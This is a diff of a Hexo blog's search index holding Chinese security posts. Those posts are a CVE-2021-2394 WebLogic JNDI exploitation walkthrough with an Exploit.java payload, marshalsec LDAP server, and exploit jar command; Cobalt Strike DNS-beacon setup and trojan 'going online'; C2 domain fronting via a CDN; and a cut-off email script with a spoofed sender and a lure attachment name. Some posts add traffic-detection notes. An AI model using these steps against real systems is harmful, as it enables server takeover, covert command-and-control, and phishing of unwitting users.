@@ -1,72 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CVE-2021-2394</title>
-    <url>/CVE-2021-2394/</url>
-    <content><![CDATA[<h1 id="CVE-2021-2394"><a href="#CVE-2021-2394" class="headerlink" title="CVE-2021-2394"></a>CVE-2021-2394</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a><strong>一、简介</strong></h2><p>​    oracle公司在2021年7月重要补丁更新报告中，通告中披露了WebLogic组件存在高危漏洞，攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击。成功利用该漏洞的攻击者可以接管WebLogic Server。</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
-<h2 id="二、复现环境："><a href="#二、复现环境：" class="headerlink" title="二、复现环境："></a><strong>二、复现环境：</strong></h2><p><strong>平台：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	windows 10 </span><br><span class="line">​	kali2021</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>工具：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	jdk8  (注意，安装目录不可有空格） </span><br><span class="line">​	weblogic_12.2.1.3.0</span><br><span class="line">​	maven3.8.2 </span><br><span class="line">​	marshalsec </span><br><span class="line">​	exp </span><br><span class="line">​	python3</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="三、受影响版本"><a href="#三、受影响版本" class="headerlink" title="三、受影响版本"></a><strong>三、受影响版本</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	Oracle WebLogic Server 10.3.6.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.1.3.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.3.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.4.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="四、修复方式"><a href="#四、修复方式" class="headerlink" title="四、修复方式"></a><strong>四、修复方式</strong></h2><p>官方已发布补丁。</p>
-<p>官方下载链接：<a href="https://www.oracle.com/security-alerts/cpuapr2021.html">https://www.oracle.com/security-alerts/cpuapr2021.html</a></p>
-<h2 id="五、复现过程"><a href="#五、复现过程" class="headerlink" title="五、复现过程"></a><strong>五、复现过程</strong></h2><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a><strong>1、安装</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar</span><br></pre></td></tr></table></figure>
-
-
-
-<p>安装过程如环境搭建文档，下载weblogic 12.2.1.3.0并安装</p>
-<p><img src= "/img/loading.gif" data-lazy-src="CVE-2021-2394/img/clipboard.png" alt="img"></p>
-<h3 id="2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class"><a href="#2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class" class="headerlink" title="**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class"></a>**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac Exploit.java   // 编译</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Exploit.class </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;     </span><br><span class="line">    <span class="keyword">static</span> &#123;        </span><br><span class="line">        System.err.println(<span class="string">&quot;Pwned&quot;</span>);        </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            String cmds = <span class="string">&quot;calc&quot;</span>;            					         			 Runtime.getRuntime().exec(cmds);  <span class="comment">//执行命令        </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;           </span><br><span class="line">            e.printStackTrace();        </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务"><a href="#3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务" class="headerlink" title="**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务"></a>**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务</h3><p><strong>下载</strong>marshalsec工具</p>
-<p><code>https://github.com/mbechler/marshalsec </code></p>
-<p><strong>编译</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
-<h3 id="4、开启PYTHON服务【marshalsec-jar目录下】"><a href="#4、开启PYTHON服务【marshalsec-jar目录下】" class="headerlink" title="4、开启PYTHON服务【marshalsec.jar目录下】"></a><strong>4、开启PYTHON服务【marshalsec.jar目录下】</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
-<p><strong>开启JNDI服务【marshalsec.jar目录下】</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;192.168.24.129:8000&#x2F;#Exploit&quot; 8087</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/1629912643.png" alt="1629912643"></p>
-<h3 id="5、-攻击机-下载EXP"><a href="#5、-攻击机-下载EXP" class="headerlink" title="5、[攻击机]下载EXP"></a><strong>5、[攻击机]下载EXP</strong></h3><p><code>https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0</code></p>
-<p>运行【一条命令】</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar CVE_2021_2394.jar 192.168.24.132 7001 ldap:&#x2F;&#x2F;192.168.24.129:8087&#x2F;Exploit</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
-<p>攻击成功</p>
-<h2 id="六、流量"><a href="#六、流量" class="headerlink" title="六、流量"></a><strong>六、流量</strong></h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462621155.png" alt="clipboard-1630462621155"></p>
-<p>第一条流量</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462633173.png" alt="clipboard-1630462633173"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Metabasegeojson任意文件读取漏洞CVE-2021-41277</title>
     <url>/CVE-2021-41277-Metabasegeojson%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="Metabasegeojson任意文件读取漏洞CVE-2021-41277"><a href="#Metabasegeojson任意文件读取漏洞CVE-2021-41277" class="headerlink" title="Metabasegeojson任意文件读取漏洞CVE-2021-41277"></a>Metabasegeojson任意文件读取漏洞CVE-2021-41277</h1><h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>​    在受影响的版本中，自定义 GeoJSON 地图（admin-&gt;settings-&gt;maps-&gt;custom maps-&gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息</p>
@@ -86,6 +20,51 @@
       <categories>
         <category>漏洞复现</category>
         <category>Metabasegeojson</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CS_DNS_Beacon</title>
+    <url>/CS-DNS-Beacon/</url>
+    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ul>
+<li><p>Cobalt strike4.4</p>
+</li>
+<li><p>VPS（服务器）</p>
+</li>
+<li><p>域名</p>
+</li>
+</ul>
+<h2 id="二、域名解析配置"><a href="#二、域名解析配置" class="headerlink" title="二、域名解析配置"></a>二、域名解析配置</h2><p>一条A记录，一条NS记录</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519163940795.png" alt="image-20220519163940795"></p>
+<h3 id="1、申请一个域名"><a href="#1、申请一个域名" class="headerlink" title="1、申请一个域名"></a>1、申请一个域名</h3><p>​    【WWW.XX#X.TK]</p>
+<h3 id="2、配置解析记录"><a href="#2、配置解析记录" class="headerlink" title="2、配置解析记录"></a>2、配置解析记录</h3><p>​    此次使用的是CDN配置</p>
+<p>​    地址：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NS记录：NS1  NS1.xxx.tk WWW.xxx.tk </span><br><span class="line"></span><br><span class="line">A记录： A     WWW.xxx.tk   IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、等待生效"><a href="#3、等待生效" class="headerlink" title="3、等待生效"></a>3、等待生效</h3><p>​    时间比较久</p>
+<h2 id="三、CS-DNS-Beacon"><a href="#三、CS-DNS-Beacon" class="headerlink" title="三、CS DNS Beacon"></a>三、CS DNS Beacon</h2><h3 id="1、VPS运行服务端"><a href="#1、VPS运行服务端" class="headerlink" title="1、VPS运行服务端"></a>1、VPS运行服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  VPS-IP Password</span><br><span class="line">#注意53端口，如存在服务，需要关闭 netstat -ano | grep 53</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2、本地机器添加监听"><a href="#2、本地机器添加监听" class="headerlink" title="2、本地机器添加监听"></a>2、本地机器添加监听</h3><p>DNS-HOSTS 使用的是NS的域名</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165639252.png" alt="image-20220519165639252"></p>
+<h3 id="3、生成木马"><a href="#3、生成木马" class="headerlink" title="3、生成木马"></a>3、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165859802.png" alt="image-20220519165859802"></p>
+<h3 id="4、上线"><a href="#4、上线" class="headerlink" title="4、上线"></a>4、上线</h3><p>​    目标机执行木马，但默认情况下主机信息是黑色，需要执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkin </span><br><span class="line">mode dns-txt</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519170235965.png" alt="image-20220519170235965"></p>
+<h2 id="四、CS上线流量特征"><a href="#四、CS上线流量特征" class="headerlink" title="四、CS上线流量特征"></a>四、CS上线流量特征</h2><p>​    受害机器发送大量的请求包，并且很多流量包中请求和响应的的域名较长</p>
+<ul>
+<li>过滤查询域名长度超过一定数值时判定为可疑</li>
+<li>大量请求同一个二级域名，并且查询结果为0.0.0.0，查询状态为成功</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519171432350.png" alt="image-20220519171432350"></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>Tools</category>
       </categories>
       <tags>
         <tag>安全</tag>
@@ -175,6 +154,125 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2021-2394</title>
+    <url>/CVE-2021-2394/</url>
+    <content><![CDATA[<h1 id="CVE-2021-2394"><a href="#CVE-2021-2394" class="headerlink" title="CVE-2021-2394"></a>CVE-2021-2394</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a><strong>一、简介</strong></h2><p>​    oracle公司在2021年7月重要补丁更新报告中，通告中披露了WebLogic组件存在高危漏洞，攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击。成功利用该漏洞的攻击者可以接管WebLogic Server。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
+<h2 id="二、复现环境："><a href="#二、复现环境：" class="headerlink" title="二、复现环境："></a><strong>二、复现环境：</strong></h2><p><strong>平台：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	windows 10 </span><br><span class="line">​	kali2021</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>工具：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	jdk8  (注意，安装目录不可有空格） </span><br><span class="line">​	weblogic_12.2.1.3.0</span><br><span class="line">​	maven3.8.2 </span><br><span class="line">​	marshalsec </span><br><span class="line">​	exp </span><br><span class="line">​	python3</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、受影响版本"><a href="#三、受影响版本" class="headerlink" title="三、受影响版本"></a><strong>三、受影响版本</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	Oracle WebLogic Server 10.3.6.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.1.3.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.3.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.4.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="四、修复方式"><a href="#四、修复方式" class="headerlink" title="四、修复方式"></a><strong>四、修复方式</strong></h2><p>官方已发布补丁。</p>
+<p>官方下载链接：<a href="https://www.oracle.com/security-alerts/cpuapr2021.html">https://www.oracle.com/security-alerts/cpuapr2021.html</a></p>
+<h2 id="五、复现过程"><a href="#五、复现过程" class="headerlink" title="五、复现过程"></a><strong>五、复现过程</strong></h2><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a><strong>1、安装</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar</span><br></pre></td></tr></table></figure>
+
+
+
+<p>安装过程如环境搭建文档，下载weblogic 12.2.1.3.0并安装</p>
+<p><img src= "/img/loading.gif" data-lazy-src="CVE-2021-2394/img/clipboard.png" alt="img"></p>
+<h3 id="2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class"><a href="#2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class" class="headerlink" title="**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class"></a>**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac Exploit.java   // 编译</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Exploit.class </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;     </span><br><span class="line">    <span class="keyword">static</span> &#123;        </span><br><span class="line">        System.err.println(<span class="string">&quot;Pwned&quot;</span>);        </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            String cmds = <span class="string">&quot;calc&quot;</span>;            					         			 Runtime.getRuntime().exec(cmds);  <span class="comment">//执行命令        </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;           </span><br><span class="line">            e.printStackTrace();        </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务"><a href="#3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务" class="headerlink" title="**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务"></a>**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务</h3><p><strong>下载</strong>marshalsec工具</p>
+<p><code>https://github.com/mbechler/marshalsec </code></p>
+<p><strong>编译</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
+<h3 id="4、开启PYTHON服务【marshalsec-jar目录下】"><a href="#4、开启PYTHON服务【marshalsec-jar目录下】" class="headerlink" title="4、开启PYTHON服务【marshalsec.jar目录下】"></a><strong>4、开启PYTHON服务【marshalsec.jar目录下】</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
+<p><strong>开启JNDI服务【marshalsec.jar目录下】</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;192.168.24.129:8000&#x2F;#Exploit&quot; 8087</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/1629912643.png" alt="1629912643"></p>
+<h3 id="5、-攻击机-下载EXP"><a href="#5、-攻击机-下载EXP" class="headerlink" title="5、[攻击机]下载EXP"></a><strong>5、[攻击机]下载EXP</strong></h3><p><code>https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0</code></p>
+<p>运行【一条命令】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar CVE_2021_2394.jar 192.168.24.132 7001 ldap:&#x2F;&#x2F;192.168.24.129:8087&#x2F;Exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
+<p>攻击成功</p>
+<h2 id="六、流量"><a href="#六、流量" class="headerlink" title="六、流量"></a><strong>六、流量</strong></h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462621155.png" alt="clipboard-1630462621155"></p>
+<p>第一条流量</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462633173.png" alt="clipboard-1630462633173"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cs域前置隐藏</title>
+    <url>/cs%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F/</url>
+    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>​    域前置（Domain fronting），是一种能够隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过 HTTPS 连接到被屏蔽的服务，而表面上像是在与另一个完全不同的站点通信。</p>
+<p>​    因为在处理HTTPS请求时，CDN会首先将它解密，并根据HTTP Host的值做请求转发，所以用户想要访问一个非法网站，可以使用一个CDN上的合法的域名作为SNI（和TLS服务器名称指示），然后使用想要访问的网站作为HTTP Host与CDN进行HTTPS通信</p>
+<h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><p>​    VPS服务器、域名</p>
+<h3 id="1、添加CDN-A记录"><a href="#1、添加CDN-A记录" class="headerlink" title="1、添加CDN A记录"></a>1、添加CDN A记录</h3><p><a href="https://www.cloudflare.com/zh-cn/">https://www.cloudflare.com/zh-cn/</a></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614152757840.png" alt="image-20220614152757840"></p>
+<h3 id="2、找到CDN后的IP"><a href="#2、找到CDN后的IP" class="headerlink" title="2、找到CDN后的IP"></a>2、找到CDN后的IP</h3><p><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614153040493.png" alt="image-20220614153040493"></p>
+<h3 id="3、找到使用相同CDN的域名"><a href="#3、找到使用相同CDN的域名" class="headerlink" title="3、找到使用相同CDN的域名"></a>3、找到使用相同CDN的域名</h3><p>可以通过asn来查询 </p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614153145329.png" alt="image-20220614153145329"></p>
+<p>4、测试 curl 域前置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl www.aaa.com  -H &quot;Host:www.attack.com&quot; -v</span><br><span class="line">#curl &#x2F;&#x2F;相同CDN的域名  -H &quot;Host:C2的域名&quot; -v</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220615153804870.png" alt="image-20220615153804870"></p>
+<ul>
+<li>流量特征</li>
+</ul>
+<p>​    会话中的域名和HTTP内容中的HOST不相同，【如果是HTTPS将较好的隐藏】</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614161208780.png" alt="image-20220614161208780"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614155701781.png" alt="image-20220614155701781"></p>
+<h2 id="三、CS使用域前置"><a href="#三、CS使用域前置" class="headerlink" title="三、CS使用域前置"></a>三、CS使用域前置</h2><p>创建监听</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-1655344821611.png" alt="img"></p>
+<h2 id="四、流量"><a href="#四、流量" class="headerlink" title="四、流量"></a>四、流量</h2><p>域名和host值不相同</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220615154454798.png" alt="image-20220615154454798"></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>git将本地代码上传到远程仓库</title>
     <url>/git%E5%B0%86%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
     <content><![CDATA[<p><strong>1.注册账户</strong><br><a href="https://github.com/">https://github.com/</a><br><strong>2.新建库</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091458521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
@@ -205,24 +303,6 @@
       <tags>
         <tag>git</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>selenium模块</title>
@@ -561,6 +641,23 @@
       </tags>
   </entry>
   <entry>
+    <title>邮件</title>
+    <url>/%E9%82%AE%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="邮件相关【杂】"><a href="#邮件相关【杂】" class="headerlink" title="邮件相关【杂】"></a>邮件相关【杂】</h1><h2 id="一、内网邮件服务器"><a href="#一、内网邮件服务器" class="headerlink" title="一、内网邮件服务器"></a>一、内网邮件服务器</h2><p>​    第三方软件HMailServer，可以很容易搭建内网邮件服务器 —适用于windows  亲测有效。留存。【很详细】</p>
+<p><a href="https://www.cnblogs.com/tiger-fu/p/7448005.html">https://www.cnblogs.com/tiger-fu/p/7448005.html</a></p>
+<p><a href="https://blog.csdn.net/gelupu/article/details/38325029">https://blog.csdn.net/gelupu/article/details/38325029</a></p>
+<h2 id="二、邮件"><a href="#二、邮件" class="headerlink" title="二、邮件"></a>二、邮件</h2><p>​    建议可以使用云函数发送，可以避免自身的真实IP泄露</p>
+<p>pyhon 发送邮箱【带附件】</p>
+<p>#注意模块的安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.mime.multipart import MIMEMultipart</span><br><span class="line">#输入发件人邮箱名称</span><br><span class="line">email_name &#x3D; &#39;邮箱【建议写自定义邮箱】&#39;</span><br><span class="line"># 输入用户授权码</span><br><span class="line">passwd &#x3D; &#39;授权码 QQ邮箱-账户&#39;</span><br><span class="line"># 收件人邮箱</span><br><span class="line">msg_to &#x3D; &#39;收件人邮箱&#39;</span><br><span class="line"># 邮件的正文</span><br><span class="line">content &#x3D; &quot;测试&quot;</span><br><span class="line"># 设置邮件</span><br><span class="line">msg &#x3D; MIMEText(content)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;utf-8&quot;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: base64 5rWL6K+V</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">msg[&#39;subject&#39;]&#x3D;&#39;嗷~&#39;</span><br><span class="line">#设置发件人</span><br><span class="line">msg[&#39;From&#39;]&#x3D; &#39;你隔壁的小王&#39;</span><br><span class="line"># 这个参数设置要发给谁</span><br><span class="line">msg[&#39;To&#39;] &#x3D; msg_to</span><br><span class="line">#添加附件内容</span><br><span class="line">msg.attach(content_part)</span><br><span class="line"></span><br><span class="line">#*********************构造附件***********</span><br><span class="line"># 文本类型的附件</span><br><span class="line">att1 &#x3D; MIMEText(open(&quot;.&#x2F;baidu.doc&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att1[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att1.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;学习最新信息.txt&#39;))</span><br><span class="line"># 